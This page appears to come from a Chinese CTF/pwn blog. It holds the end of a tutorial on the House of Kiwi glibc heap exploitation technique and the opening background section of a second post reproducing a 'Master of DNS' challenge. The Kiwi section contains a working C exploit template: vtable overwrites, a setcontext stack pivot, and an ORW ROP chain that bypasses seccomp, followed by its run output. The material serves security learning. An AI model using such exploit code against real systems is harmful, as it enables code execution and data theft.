<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e8c4ba</span> &lt;sysmalloc+<span class="number">1850</span>&gt;    call   __malloc_assert                &lt;__malloc_assert&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff7f912b8</span> ◂— <span class="string">&#x27;(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27;</span></span><br><span class="line">       rsi: <span class="number">0x7ffff7f8cca5</span> ◂— <span class="string">&#x27;malloc.c&#x27;</span></span><br><span class="line">       rdx: <span class="number">0x95a</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7f91b40</span> (__PRETTY_FUNCTION__<span class="number">.13329</span>) ◂— <span class="string">&#x27;sysmalloc&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>继续跟进 <code>__malloc_assert</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e89cb0</span> &lt;__malloc_assert+<span class="number">80</span>&gt;    call   fflush                &lt;fflush&gt;</span><br><span class="line">       stream: <span class="number">0x7ffff7fc35e0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br></pre></td></tr></table></figure>
<ul>
<li>进行跟进 <code>fflush</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e78523</span> &lt;fflush+<span class="number">131</span>&gt;    call   qword ptr [rbp + <span class="number">0x60</span>]        &lt;setcontext+<span class="number">61</span>&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff7fc35e0</span> (_IO_2_1_stderr_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line">       rsi: <span class="number">0xc00</span></span><br><span class="line">       rdx: <span class="number">0x7ffff7fc38c0</span> (_IO_helper_jumps) ◂— <span class="number">0x0</span></span><br><span class="line">       rcx: <span class="number">0x7ffff7ef2417</span> (write+<span class="number">23</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现其 <code>rdx</code> 是个定值，而 <code>setcontext+61</code> 就是根据 <code>rdx</code> 进行操作：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope setcontext+<span class="number">61</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7e5051d</span> (setcontext+<span class="number">61</span>) ◂— mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7e50525</span> (setcontext+<span class="number">69</span>) ◂— mov    ebx, dword ptr [rdx + <span class="number">0x80</span>]</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7e5052d</span> (setcontext+<span class="number">77</span>) ◂— push   <span class="number">0x78</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7e50535</span> (setcontext+<span class="number">85</span>) ◂— push   <span class="number">0x50</span></span><br></pre></td></tr></table></figure>
<ul>
<li>所以我们可以提前修改 <code>IO_helper_jumps + 0xA0 and 0xA8</code> 来配合 <code>setcontext+61</code> 进行操作</li>
</ul>
<h2 id="House-Of-Kiwi-利用姿势"><a href="#House-Of-Kiwi-利用姿势" class="headerlink" title="House Of Kiwi 利用姿势"></a>House Of Kiwi 利用姿势</h2><p>利用模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret libc_base + 0x0000000000027b26</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_r12 libc_base + 0x00000000000f83b1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsi_ret libc_base + 0x000000000003269a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rax_ret libc_base + 0x000000000003fdc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> syscall_ret libc_base + 0x0000000000075f8a + 0x2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="keyword">size_t</span> libc_base;</span><br><span class="line"><span class="keyword">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setROP</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="keyword">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="keyword">size_t</span>)setvbuf) - <span class="number">0x76b40</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> magic_gadget = libc_base + <span class="number">0x4c4e0</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="keyword">size_t</span> IO_helper = libc_base + <span class="number">0x1bf8c0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="keyword">size_t</span> SYNC = libc_base + <span class="number">0x1c0520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx(setcontext运行完后会首先调用的指令地址)</span></span><br><span class="line">    *((<span class="keyword">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> *top_size = (<span class="keyword">size_t</span>*)((<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写&#x27;0&#x27;,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  exp gcc test.c -o test -z noexecstack -fstack-protector-all -pie -z now -masm=intel -g</span><br><span class="line">test.c: In function ‘main’:</span><br><span class="line">test.c:72:36: warning: assignment to ‘size_t’ &#123;aka ‘long unsigned int’&#125; from ‘size_t *’ &#123;aka ‘long unsigned int *’&#125; makes integer from pointer without a cast [-Wint-conversion]</span><br><span class="line">   72 |     *((size_t*)IO_helper + 0xA0/8) = ROP; // 设置rsp</span><br><span class="line">      |                                    ^</span><br><span class="line">➜  exp patchelf ./test --set-interpreter ./ld-2.32.so   --replace-needed libc.so.6 ./libc-2.32.so --output  test1</span><br><span class="line">➜  exp ./test1</span><br><span class="line">LIBC:	0x7f50a420d000</span><br><span class="line">test1: malloc.c:2394: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">��&lt;�P[1]    5018 segmentation fault  ./test1</span><br></pre></td></tr></table></figure>
<p>利用条件：</p>
<ul>
<li>三次 WAA，分别进行如下的修改：<ul>
<li><code>_IO_file_sync -&gt; setcontext + 61</code></li>
<li><code>IO_helper_jumps + 0xA0 -&gt; ORW_ROP_addr</code></li>
<li><code>IO_helper_jumps + 0xA0 -&gt; ret</code></li>
</ul>
</li>
<li>能够触发 <code>__malloc_assert</code>，有如下两种方式：<ul>
<li>修改相应 largebin 中最小 chunk 的 flag-&gt;A 为“1”</li>
<li>使 top chunk 不足以申请从而调用 <code>sysmalloc</code>，将 flag-&gt;P 写 “0”</li>
</ul>
</li>
</ul>
<h2 id="版本对-House-Of-Kiwi-的影响"><a href="#版本对-House-Of-Kiwi-的影响" class="headerlink" title="版本对 House Of Kiwi 的影响"></a>版本对 House Of Kiwi 的影响</h2><p><strong>libc-2.34</strong></p>
<p>在 libc-2.34 的早期版本中（glibc-2.34-0ubuntu3_amd64 以及之前），vtable 可写，但在 glibc-2.34-0ubuntu3.2_amd64 中 vtable 不可写</p>
<p>所以在 glibc-2.34-0ubuntu3_amd64 以及之前，House Of Kiwi 都是可以正常使用的，再次之后就无法使用了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">DNS协议+BinDiff的使用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-28 20:10:08 / Modified: 20:14:01" itemprop="dateCreated datePublished" datetime="2022-07-28T20:10:08+08:00">2022-07-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Master of DNS 复现</strong></p>
<p>提示：题目参考代码: <a target="_blank" rel="noopener" href="https://thekelleys.org.uk/dnsmasq/doc.html">https://thekelleys.org.uk/dnsmasq/doc.html</a> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dns: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, BuildID[sha1]=bfc562d299a85ac0c0be7037b9436f0a9500d2c4, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>32位，dynamically，开了 NX，Full RELRO</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">port=<span class="number">9999</span></span><br><span class="line">no-resolv</span><br><span class="line">server = <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line">server = <span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span></span><br><span class="line">listen-address=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">bind-interfaces</span><br><span class="line">no-hosts</span><br><span class="line">no-negcache</span><br><span class="line">address=/test.com/<span class="number">5.5</span><span class="number">.5</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>没有遇见过的东西，先学习相关知识</li>
</ul>
<p><strong>域名</strong></p>
<p>域名又称网域，是由一串用点分隔的名字组成的 Internet 上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（由于 IP 地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名）</p>
<p>域名具有一定的层次结构，从上到下依次为：<strong>根域名</strong>， <strong>顶级域名</strong>（top level domain，TLD）， <strong>二级域名</strong>，（三级域名） </p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658901597891.png" alt="1658901597891"> </p>
<p>理论上，<strong>所有域名的查询都必须先查询根域名</strong>，因为只有根域名才能告诉你，某个顶级域名由哪台服务器管理，事实上也确实如此，ICANN 维护着一张列表（根域名列表），里面记载着顶级域名和对应的托管商</p>
<p><strong>域名服务器</strong></p>
<p>域名服务器是指 <strong>管理域名的主机和相应的软件</strong> ，它可以管理所在分层的域的相关信息，一个域名服务器所负责管里的分层叫作 <strong>区 (ZONE)</strong>，域名的每层都设有一个域名服务器：</p>
<ul>
<li>根域名服务器<ul>
<li>保存 DNS 根区文件（ICANN 维护的根域名列表）的服务器，就叫做 <strong>DNS 根域名服务器</strong>（root name server），根域名服务器 <strong>保存所有的顶级域名服务器的地址</strong> </li>
<li>一般来说所有的域名服务器都会注册一份根域名服务器的 IP 地址的缓存，用于在必要的时候向其发送请求</li>
</ul>
</li>
<li>顶级域名服务器<ul>
<li>顶级域名服务器显然就是用来 <strong>管理注册在该顶级域名下的所有二级域名</strong> 的，记录这些二级域名的 IP 地址</li>
</ul>
</li>
<li>权限域名服务器<ul>
<li>三/四级域名数量很多，我们需要使用 <strong>划分区</strong> 的办法来解决这个问题，权限域名服务器 <strong>就是负责管理一个“区”</strong> 的域名服务器</li>
</ul>
</li>
<li>本地域名服务器（不在 DNS 层次结构之中）<ul>
<li>本地域名服务器（也被称为权威域名服务器），本地域名服务器是 <strong>电脑解析时的默认域名服务器，即电脑中设置的首选 DNS 服务器和备选 DNS 服务器</strong>，常见的有电信、联通、谷歌、阿里等的本地 DNS 服务</li>
</ul>
</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658901933634.png" alt="1658901933634"> </p>
<p><strong>DNS 协议</strong></p>
<p>通过域名解析协议（DNS，Domain Name System）来将域名和 IP 地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数串</p>
<ul>
<li>正向解析：将域名映射成 IP 地址</li>
<li>反向解析：将 IP 地址映射成域名</li>
</ul>
<p>DNS 协议可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53（但大多数情况下 DNS 都使用 UDP 进行传输）</p>
<p>具体 DNS 查询的方式有两种：</p>
<ul>
<li>迭代查询<ul>
<li>如果请求的接收者不知道所请求的内容，那么 <strong>接收者将告诉请求者如何去获得这个内容</strong>，请求者自己再去查询</li>
</ul>
</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903022387.png" alt="1658903022387">  </p>
<ul>
<li>递归查询<ul>
<li>如果请求的接收者不知道所请求的内容，那么 <strong>接收者将扮演请求者</strong>，发出有关请求，直到获得所需要的内容，然后将内容返回给最初的请求者 </li>
</ul>
</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903003005.png" alt="1658903003005"> </p>
<p><strong>DNS 数据包结构</strong></p>
<p>总体结构：</p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976619426.png" alt="1658976619426"> </p>
<ul>
<li>DNS 请求包和响应包格式相同（只有 Flag 不一样）</li>
</ul>
<p>基础结构部分：（Header）</p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977012140.png" alt="1658977012140">  </p>
<ul>
<li>事务 ID：DNS 报文的 ID 标识。对于请求报文和其对应的应答报文，该字段的值是相同的。通过它可以区分 DNS 应答报文是对哪个请求进行响应的</li>
<li>标志：DNS 报文中的标志字段</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976734669.png" alt="1658976734669"> </p>
<ul>
<li>问题计数：DNS 查询请求的数目</li>
<li>回答资源记录数：DNS 响应的数目</li>
<li>权威名称服务器计数：权威名称服务器的数目</li>
<li>附加资源记录数：额外的记录数目（权威名称服务器对应 IP 地址的数目）  </li>
</ul>
<p>问题部分： </p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976977290.png" alt="1658976977290">  </p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658976961430.png" alt="1658976961430"> </p>
<ul>
<li>查询名：一般为要查询的域名，有时也会是 IP 地址，用于反向查询</li>
<li>查询类型：DNS 查询请求的资源类型。通常查询类型为 A 类型，表示由域名获取对应的 IP 地址</li>
<li>查询类：地址类型，通常为互联网地址，值为 1</li>
</ul>
<p>资源记录部分：</p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977108843.png" alt="1658977108843"> </p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658977155842.png" alt="1658977155842"> </p>
<ul>
<li>域名：DNS 请求的域名</li>
<li>类型：资源记录的类型，与问题部分中的查询类型值是一样的</li>
<li>类：地址类型，与问题部分中的查询类值是一样的</li>
<li>生存时间：以秒为单位，表示资源记录的生命周期，一般用于当地址解析程序取出资源记录后决定保存及使用缓存数据的时间，它同时也可以表明该资源记录的稳定程度，稳定的信息会被分配一个很大的值</li>
<li>资源数据长度：资源数据的长度</li>
<li>资源数据：表示按查询段要求返回的相关资源记录的数据</li>
</ul>
<p>PS：其实不用太了解每个部分的功能，只要一模一样就可以了</p>
<p>DNS请求：</p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658995769276.png" alt="1658995769276"> </p>
<p>DNS响应：</p>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/20190724165030968.png" alt="20190724165030968"> </p>
<p>这里只需要注意 Flag，分清楚 <code>DNS请求/DNS响应</code> 就好</p>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/buside/article/details/97139367">Wireshark分析DNS协议</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/anhenzhufeng/article/details/109860393">DNS报文格式解析（非常详细）</a></li>
</ul>
<p><strong>完整域名解析过程</strong></p>
<p>正向解析：</p>
<ul>
<li>首先搜索 <strong>浏览器的 DNS 缓存</strong>，缓存中维护一张域名与 IP 地址的对应表</li>
<li>若没有命中，则继续搜索 <strong>操作系统的 DNS 缓存</strong></li>
<li>若仍然没有命中，则操作系统将域名发送至 <strong>本地域名服务器</strong>，本地域名服务器查询自己的 DNS 缓存，查找成功则返回结果（主机和本地域名服务器之间的查询方式是递归查询）</li>
<li>若本地域名服务器的 DNS 缓存没有命中，则本地域名服务器向上级域名服务器进行查询，通过以下方式进行迭代查询：<ul>
<li>首先本地域名服务器向 <strong>根域名服务器</strong> 发起请求，根域名服务器是最高层次的，它并不会直接指明这个域名对应的 IP 地址，而是返回顶级域名服务器的地址</li>
<li>本地域名服务器拿到这个 <strong>顶级域名服务器</strong> 的地址后，就向其发起请求，获取 <strong>权限域名服务器</strong> 的地址</li>
<li>本地域名服务器根据权限域名服务器的地址向其发起请求，最终得到该域名对应的 IP 地址</li>
</ul>
</li>
<li>本地域名服务器将得到的 IP 地址返回给操作系统，同时自己将 IP 地址缓存起来</li>
<li>操作系统将 IP 地址返回给浏览器，同时自己也将 IP 地址缓存起来</li>
<li>至此，浏览器就得到了域名对应的 IP 地址，并将 IP 地址缓存起来</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658903762258.png" alt="1658903762258"> </p>
<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/351059293">超详细 DNS 协议解析 - 知乎</a> </p>
<p><strong>调试准备</strong></p>
<p>首先常规的 GDB 调试是不起作用的</p>
